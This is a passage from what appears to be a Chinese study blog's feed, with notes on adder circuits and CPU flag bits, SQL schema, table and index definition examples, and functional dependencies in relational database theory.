alt="image-20220611221708902"></p><p>本质上逻辑表达式是对电路的数学描述，简化逻辑表达式就是在简化电路设计</p><h3 id="复合逻辑"><a class="markdownIt-Anchor" href="#复合逻辑">#</a> 复合逻辑</h3><p><img src="http://wuriteup.oss-cn-qingdao.aliyuncs.com/img/image-20220611222247264.png" alt="image-20220611222247264"></p><p>与非就是先与再非，或非就是先或再非</p><p>反演律：</p><ul><li>A 或 B 的非等于 A 的非与 B 的非</li><li>A 与 B 的非等于 A 的非或 B 的非</li></ul><p>同或 ： 异或取反</p><p><img src="http://wuriteup.oss-cn-qingdao.aliyuncs.com/img/image-20220611222312945.png" alt="image-20220611222312945"></p><h3 id="用门电路求偶校验位"><a class="markdownIt-Anchor" href="#用门电路求偶校验位">#</a> 用门电路求偶校验位</h3><p><img src="http://wuriteup.oss-cn-qingdao.aliyuncs.com/img/image-20220611222527248.png" alt="image-20220611222527248"></p><h3 id="一位全加器"><a class="markdownIt-Anchor" href="#一位全加器">#</a> 一位全加器</h3><p><img src="http://wuriteup.oss-cn-qingdao.aliyuncs.com/img/image-20220611223042793.png" alt="image-20220611223042793"></p><h3 id="串行加法器"><a class="markdownIt-Anchor" href="#串行加法器">#</a> 串行加法器</h3><p><img src="http://wuriteup.oss-cn-qingdao.aliyuncs.com/img/image-20220611223245264.png" alt="image-20220611223245264"></p><h3 id="串行进位的并行加法器"><a class="markdownIt-Anchor" href="#串行进位的并行加法器">#</a> 串行进位的并行加法器</h3><p><img src="http://wuriteup.oss-cn-qingdao.aliyuncs.com/img/image-20220611223308335.png" alt="image-20220611223308335"></p><p>串行进位又称为行波进位，每一级进位直接依赖于前一级的进位，级进位信号是逐级形成的</p><p><img src="http://wuriteup.oss-cn-qingdao.aliyuncs.com/img/image-20220611223419366.png" alt="image-20220611223419366"></p><h3 id="并行进位加法器"><a class="markdownIt-Anchor" href="#并行进位加法器">#</a> 并行进位加法器</h3><p>以上的串行进位的并行加法器，下一位的结果都依赖于上一位 C 的输出，只有上一位的运算结果出来以后下一位才能进行运算，运算速度还是受进位信息产生速度的影响。</p><p>每个进位产生的逻辑表达式:<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>C</mi><mi>i</mi></msub><mo>=</mo><msub><mi>A</mi><mi>i</mi></msub><msub><mi>B</mi><mi>i</mi></msub><mo>+</mo><mo stretchy="false">(</mo><msub><mi>A</mi><mi>i</mi></msub><mo>⨁</mo><msub><mi>B</mi><mi>i</mi></msub><mo stretchy="false">)</mo><msub><mi>C</mi><mrow><mi>i</mi><mo>−</mo><mn>1</mn></mrow></msub></mrow><annotation encoding="application/x-tex">C_i = A_iB_i + (A_i \bigoplus B_i )C_{i-1}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:-0.07153em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">A</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05017em;">B</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:-0.05017em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.00001em;vertical-align:-0.25001em;"></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">A</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mop op-symbol small-op" style="position:relative;top:-0.0000050000000000050004em;">⨁</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05017em;">B</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:-0.05017em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.311664em;"><span style="top:-2.5500000000000003em;margin-left:-0.07153em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mbin mtight">−</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.208331em;"><span></span></span></span></span></span></span></span></span></span>，依赖于两个本位的数值和来自低位的进位，Ci-1 可以继续进行展开</p><p><img src="http://wuriteup.oss-cn-qingdao.aliyuncs.com/img/image-20220611224122561.png" alt=""></p><p><img src="http://wuriteup.oss-cn-qingdao.aliyuncs.com/img/image-20220611224449416.png" alt="image-20220611224449416"></p><p>这种加法器的设计每个位的进位几乎是同时产生的</p><p>不足：位数越多电路表达式会越复杂，一般最高到 4 位加 4 位的运算</p><h3 id="补码加减运算器"><a class="markdownIt-Anchor" href="#补码加减运算器">#</a> 补码加减运算器</h3><p>加法器原理</p><p><img src="http://wuriteup.oss-cn-qingdao.aliyuncs.com/img/image-20220612084603472.png" alt="image-20220612084603472"></p><p>补码加 / 减法运算</p><ul><li>n bit 补码 X+Y，按位相加即可</li><li>n bit 补码 X-Y：将补码 Y 全部按位取反，末位 + 1，得到 [-Y] 补，减法变加法</li></ul><p><img src="http://wuriteup.oss-cn-qingdao.aliyuncs.com/img/image-20220612085110066.png" alt="image-20220612085110066"></p><p>无符号整数的加 / 减法也可以用该电路实现</p><ul><li>无符号数 X+Y，按位相加即可</li><li>无符号整数 X-Y，将 Y 全部按位取反，末位 + 1，减法变加法</li></ul><p>补码加减运算和无符数的加减运算都可以用<strong>同一个运算器</strong>实现，但是<strong>溢出位</strong>的判断不同</p><p>所以底层的硬件都是同一套逻辑，不管给的数是有符号还是无符号，因此溢出判断要进行处理</p><h3 id="标志位的生成"><a class="markdownIt-Anchor" href="#标志位的生成">#</a> 标志位的生成</h3><p><img src="http://wuriteup.oss-cn-qingdao.aliyuncs.com/img/image-20220612090128363.png" alt="image-20220612090128363"></p><p>加法器输出四个标志位的信息</p><p><img src="http://wuriteup.oss-cn-qingdao.aliyuncs.com/img/image-20220612090054927.png" alt="image-20220612090054927"></p><p>OF：溢出标志，只在<strong>有符号数的加减运算</strong>时有效（无符号运算时即使 OF=1，也不能说明发生了溢出）</p><ul><li>OF 的硬件逻辑：OF = 最高位的进位异或次高位的进位</li><li>在有符号整数的运算中，如果发生了溢出，可以判断这个运算结果是错误的</li></ul><p>SF：符号标志，运算结果为正则置为 0，结果为负则置为 1</p><ul><li>SF 的硬件计算方法：SF = 最高位的本位和</li><li>SF 位对无符号数的加减法无意义</li></ul><p>ZF：零标志，运算结果为 0 时 ZF 置为 1，否则为 0</p><ul><li>对有符号数和无符号数都有意义</li></ul><p>CF：进位 / 错位标志，进位 / 错位时置 1，否则置 0</p><ul><li>CF 表示无符号数的加减法是否发生了进位或错位，只对无符号数有意义，对有符号数无意义</li></ul><p><img src="http://wuriteup.oss-cn-qingdao.aliyuncs.com/img/image-20220612091019254.png" alt="image-20220612091019254"></p><ul><li>产生借位意思为被减数不够减，要向上一位借一位，所以发生 CF 时结果是错误的，就是产生了溢出</li></ul><p><strong>有符号</strong>整数加减运算是否产生了溢出要看 OF 位，<strong>无符号</strong>整数加减运算是否产生溢出要看<strong> CF</strong> 位</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;无符号整数的表示和运算&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#无符号整数的表示和运算&quot;&gt;#&lt;/a&gt; 无符号整数的表示和运算&lt;/h2&gt;
&lt;h3 id=&quot;无符号整数的加法&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; </summary>
      
    
    
    
    <category term="计算机组成原理" scheme="http://example.com/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/"/>
    
    
    <category term="计算机组成原理" scheme="http://example.com/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/"/>
    
    <category term="408" scheme="http://example.com/tags/408/"/>
    
  </entry>
  
  <entry>
    <title>数据库-关系数据库标准语言SQL</title>
    <link href="http://example.com/post/%E6%95%B0%E6%8D%AE%E5%BA%93-%E5%85%B3%E7%B3%BB%E6%95%B0%E6%8D%AE%E5%BA%93%E6%A0%87%E5%87%86%E8%AF%AD%E8%A8%80SQL.html"/>
    <id>http://example.com/post/%E6%95%B0%E6%8D%AE%E5%BA%93-%E5%85%B3%E7%B3%BB%E6%95%B0%E6%8D%AE%E5%BA%93%E6%A0%87%E5%87%86%E8%AF%AD%E8%A8%80SQL.html</id>
    <published>2022-06-09T11:13:01.000Z</published>
    <updated>2022-06-11T04:04:11.209Z</updated>
    
    <content type="html"><![CDATA[<h2 id="33-数据定义"><a class="markdownIt-Anchor" href="#33-数据定义">#</a> 3.3 数据定义</h2><h3 id="331-模式的定义与删除"><a class="markdownIt-Anchor" href="#331-模式的定义与删除">#</a> 3.3.1 模式的定义与删除</h3><h4 id="1定义模式"><a class="markdownIt-Anchor" href="#1定义模式">#</a> 1. 定义模式</h4><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">create</span> <span class="token keyword">schema</span> <span class="token operator">&lt;</span>模式名<span class="token operator">></span> <span class="token keyword">authorization</span> <span class="token operator">&lt;</span>用户名<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>例 3.1：为用户 WANG 定义一个学生 - 课程模式 S-T</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">create</span> <span class="token keyword">schema</span> <span class="token string">"S-T"</span> <span class="token keyword">authorization</span> WANG<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="2删除模式"><a class="markdownIt-Anchor" href="#2删除模式">#</a> 2. 删除模式</h4><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">drop</span> <span class="token keyword">schema</span> <span class="token operator">&lt;</span>模式名<span class="token operator">></span> <span class="token operator">&lt;</span><span class="token keyword">cascade</span><span class="token operator">|</span><span class="token keyword">restrict</span><span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="332-基本表的定义-删除与修改"><a class="markdownIt-Anchor" href="#332-基本表的定义-删除与修改">#</a> 3.3.2 基本表的定义、删除与修改</h3><h4 id="1定义基本表"><a class="markdownIt-Anchor" href="#1定义基本表">#</a> 1. 定义基本表</h4><p>例 3.5：建立一个学生表 Student</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">create</span> <span class="token keyword">table</span> student<span class="token punctuation">(</span>    sco <span class="token keyword">char</span><span class="token punctuation">(</span><span class="token number">9</span><span class="token punctuation">)</span> <span class="token keyword">primary</span> <span class="token keyword">key</span><span class="token punctuation">,</span>    sname <span class="token keyword">char</span><span class="token punctuation">(</span><span class="token number">20</span><span class="token punctuation">)</span> <span class="token keyword">unique</span><span class="token punctuation">,</span>    ssex <span class="token keyword">char</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">,</span>    sage <span class="token keyword">smallint</span><span class="token punctuation">,</span>    sdept <span class="token keyword">char</span><span class="token punctuation">(</span><span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="2数据类型"><a class="markdownIt-Anchor" href="#2数据类型">#</a> 2. 数据类型</h4><h4 id="3模式与表"><a class="markdownIt-Anchor" href="#3模式与表">#</a> 3. 模式与表</h4><h4 id="4修改基本表"><a class="markdownIt-Anchor" href="#4修改基本表">#</a> 4. 修改基本表</h4><p>例 3.8：向 Student 表增加” 入学时间 “列，其数据类型为日期型</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">alter</span> <span class="token keyword">table</span> Student <span class="token keyword">add</span> S_entrance <span class="token keyword">DATE</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>例 3.9：将年龄的数据类型由字符型（假设原来的数据类型是字符型）改为整数</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">alter</span> <span class="token keyword">table</span> Student <span class="token keyword">alter</span> <span class="token keyword">column</span> Sage <span class="token keyword">INT</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>例 3.10：增加课程名称必须取唯一值的约束条件</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">alter</span> <span class="token keyword">table</span> Student <span class="token keyword">add</span> <span class="token keyword">unique</span><span class="token punctuation">(</span>Cname<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="5删除基本表"><a class="markdownIt-Anchor" href="#5删除基本表">#</a> 5. 删除基本表</h4><p>例 3.11：删除 Student 表</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">drop</span> <span class="token keyword">table</span> Student <span class="token keyword">cascade</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="333-索引的建立与删除"><a class="markdownIt-Anchor" href="#333-索引的建立与删除">#</a> 3.3.3 索引的建立与删除</h3><h4 id="1建立索引"><a class="markdownIt-Anchor" href="#1建立索引">#</a> 1. 建立索引</h4><p>在 SQL 语言中，建立索引使用 CREATE INDEX 语句，其一般格式为：</p><p><code>CREATE [UNIQUE][CLUSTER] INDEX 索引名 ON &lt;表名&gt;(&lt;列名&gt;[&lt;次序&gt;])</code></p><p>例 3.13：为学生 - 课程数据库中的 Student、Course 和 SC 三个表建立索引。其中 Student 表按学号升序建唯一索引，Course 表按课程号升序建唯一索引，SC 表按学号升序和课程号降序建唯一索引。</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">create</span> <span class="token keyword">unique</span> <span class="token keyword">index</span> stusno <span class="token keyword">on</span> student<span class="token punctuation">(</span>Sno<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">CREATE</span> <span class="token keyword">UNIQUE</span> <span class="token keyword">INDEX</span> Coucno <span class="token keyword">ON</span> Course<span class="token punctuation">(</span>Cno<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">CREATE</span> <span class="token keyword">UNIQUE</span> <span class="token keyword">INDEX</span> SCno <span class="token keyword">ON</span> SC<span class="token punctuation">(</span>Sno <span class="token keyword">ASC</span><span class="token punctuation">,</span> Cno <span class="token keyword">DESC</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h4 id="2修改索引"><a class="markdownIt-Anchor" href="#2修改索引">#</a> 2. 修改索引</h4><p>例 3.14：将 SC 表的 SCno 索引名改为 SCSno</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">ALTER</span> <span class="token keyword">INDEX</span> SCno <span class="token keyword">RENAME</span> <span class="token keyword">TO</span> SCSno<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="3删除索引"><a class="markdownIt-Anchor" href="#3删除索引">#</a> 3. 删除索引</h4><pre class="line-numbers language-SQL" data-language="SQL"><code class="language-SQL">DROP INDEX Stusname;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="34-数据查询"><a class="markdownIt-Anchor" href="#34-数据查询">#</a> 3.4 数据查询</h3>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;33-数据定义&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#33-数据定义&quot;&gt;#&lt;/a&gt; 3.3 数据定义&lt;/h2&gt;
&lt;h3 id=&quot;331-模式的定义与删除&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#</summary>
      
    
    
    
    <category term="数据库" scheme="http://example.com/categories/%E6%95%B0%E6%8D%AE%E5%BA%93/"/>
    
    
    <category term="数据库" scheme="http://example.com/tags/%E6%95%B0%E6%8D%AE%E5%BA%93/"/>
    
  </entry>
  
  <entry>
    <title>数据库-关系数据理论</title>
    <link href="http://example.com/post/%E6%95%B0%E6%8D%AE%E5%BA%93-%E5%85%B3%E7%B3%BB%E6%95%B0%E6%8D%AE%E7%90%86%E8%AE%BA.html"/>
    <id>http://example.com/post/%E6%95%B0%E6%8D%AE%E5%BA%93-%E5%85%B3%E7%B3%BB%E6%95%B0%E6%8D%AE%E7%90%86%E8%AE%BA.html</id>
    <published>2022-06-08T13:12:23.000Z</published>
    <updated>2022-06-11T04:04:45.504Z</updated>
    
    <content type="html"><![CDATA[<h2 id="61-问题的提出"><a class="markdownIt-Anchor" href="#61-问题的提出">#</a> 6.1 问题的提出</h2><p>R(U,D,DOM,F)：</p><ul><li>关系明 R 是符号化的元组语义</li><li>U 为一组属性</li><li>D 为属性组 U 中的属性所来自的域</li><li>DOM 为属性到域的映射</li><li>F 为属性组 U 上的一组数据依赖</li></ul><p><strong>第一范式</strong>：每一个分量必须是不可分割的数据项</p><p>数据依赖是一个关系内部属性与属性之间的一种约束关系，是通过属性间值的相等与否体现出来的数据间相关联系。其中最重要的是<strong>函数依赖</strong>和<strong>多值依赖</strong>。</p><p>函数依赖：比如描述一个学生的关系，可以有学号 (sno)，姓名 (sname)，系名 (sdept) 等几个属性。由于一个学号只对应一个学生，一个学生只在一个系学习。因而当” 学号 “的值确定之后，学生的姓名及所在的系值也就被唯一地确定了。类似的有<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>S</mi><mi>n</mi><mi>a</mi><mi>m</mi><mi>e</mi><mo>=</mo><mi>f</mi><mo stretchy="false">(</mo><mi>s</mi><mi>n</mi><mi>o</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">Sname = f(sno)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="mord mathnormal">n</span><span class="mord mathnormal">a</span><span class="mord mathnormal">m</span><span class="mord mathnormal">e</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mopen">(</span><span class="mord mathnormal">s</span><span class="mord mathnormal">n</span><span class="mord mathnormal">o</span><span class="mclose">)</span></span></span></span>，<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>S</mi><mi>d</mi><mi>e</mi><mi>p</mi><mi>t</mi><mo>=</mo><mi>f</mi><mo stretchy="false">(</mo><mi>S</mi><mi>n</mi><mi>o</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">Sdept = f(Sno)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="mord mathnormal">d</span><span class="mord mathnormal">e</span><span class="mord mathnormal">p</span><span class="mord mathnormal">t</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="mord mathnormal">n</span><span class="mord mathnormal">o</span><span class="mclose">)</span></span></span></span>，即 sno 函数决定 sname，或者说 sname 函数依赖于 sno。记作<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>S</mi><mi>n</mi><mi>o</mi><mo>→</mo><mi>S</mi><mi>n</mi><mi>a</mi><mi>m</mi><mi>e</mi></mrow><annotation encoding="application/x-tex">Sno \rightarrow Sname</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="mord mathnormal">n</span><span class="mord mathnormal">o</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="mord mathnormal">n</span><span class="mord mathnormal">a</span><span class="mord mathnormal">m</span><span class="mord mathnormal">e</span></span></span></span>。</p><p Sno="" \rightarrow="" Sdept,Sdept="" \rightarrow="" Mname,(Sno,Cno)="" \rightarrow="" Grade\="">一个学生例子：F=\</p><p>但是这个关系存在以下的问题：</p><ol><li>数据冗余<ul><li>如一个系的系主任名重复出现</li></ul></li><li>更新异常</li><li>插入异常</li><li>删除异常</li></ol><p>将这个单一的模式改造如下，分成三个关系模式：</p><ul><li><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>S</mi><mo stretchy="false">(</mo><mi>S</mi><mi>n</mi><mi>o</mi><mo separator="true">,</mo><mi>S</mi><mi>d</mi><mi>e</mi><mi>p</mi><mi>t</mi><mo separator="true">,</mo><mi>S</mi><mi>n</mi><mi>o</mi><mo>→</mo><mi>S</mi><mi>d</mi><mi>e</mi><mi>p</mi><mi>t</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">S(Sno,Sdept,Sno \rightarrow Sdept )</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="mord mathnormal">n</span><span class="mord mathnormal">o</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="mord mathnormal">d</span><span class="mord mathnormal">e</span><span class="mord mathnormal">p</span><span class="mord mathnormal">t</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="mord mathnormal">n</span><span class="mord mathnormal">o</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="mord mathnormal">d</span><span class="mord mathnormal">e</span><span class="mord mathnormal">p</span><span class="mord mathnormal">t</span><span class="mclose">)</span></span></span></span></li><li><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>S</mi><mi>C</mi><mo stretchy="false">(</mo><mi>S</mi><mi>n</mi><mi>o</mi><mo separator="true">,</mo><mi>C</mi><mi>n</mi><mi>o</mi><mo separator="true">,</mo><mi>G</mi><mi>r</mi><mi>a</mi><mi>d</mi><mi>e</mi><mo separator="true">,</mo><mo stretchy="false">(</mo><mi>S</mi><mi>n</mi><mi>o</mi><mo separator="true">,</mo><mi>C</mi><mi>n</mi><mi>o</mi><mo stretchy="false">)</mo><mo>→</mo><mi>G</mi><mi>r</mi><mi>a</mi><mi>d</mi><mi>e</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">SC(Sno,Cno,Grade,(Sno,Cno) \rightarrow Grade)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="mord mathnormal">n</span><span class="mord mathnormal">o</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="mord mathnormal">n</span><span class="mord mathnormal">o</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal">G</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mord mathnormal">a</span><span class="mord mathnormal">d</span><span class="mord mathnormal">e</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="mord mathnormal">n</span><span class="mord mathnormal">o</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="mord mathnormal">n</span><span class="mord mathnormal">o</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">G</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mord mathnormal">a</span><span class="mord mathnormal">d</span><span class="mord mathnormal">e</span><span class="mclose">)</span></span></span></span></li><li><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>D</mi><mi>E</mi><mi>P</mi><mi>T</mi><mo stretchy="false">(</mo><mi>S</mi><mi>d</mi><mi>e</mi><mi>p</mi><mi>t</mi><mo separator="true">,</mo><mi>M</mi><mi>n</mi><mi>a</mi><mi>m</mi><mi>e</mi><mo separator="true">,</mo><mi>S</mi><mi>d</mi><mi>e</mi><mi>p</mi><mi>t</mi><mo>→</mo><mi>M</mi><mi>n</mi><mi>a</mi><mi>m</mi><mi>e</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">DEPT(Sdept,Mname,Sdept \rightarrow Mname)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">D</span><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="mord mathnormal">d</span><span class="mord mathnormal">e</span><span class="mord mathnormal">p</span><span class="mord mathnormal">t</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">M</span><span class="mord mathnormal">n</span><span class="mord mathnormal">a</span><span class="mord mathnormal">m</span><span class="mord mathnormal">e</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="mord mathnormal">d</span><span class="mord mathnormal">e</span><span class="mord mathnormal">p</span><span class="mord mathnormal">t</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">→</span><span class="mspace" 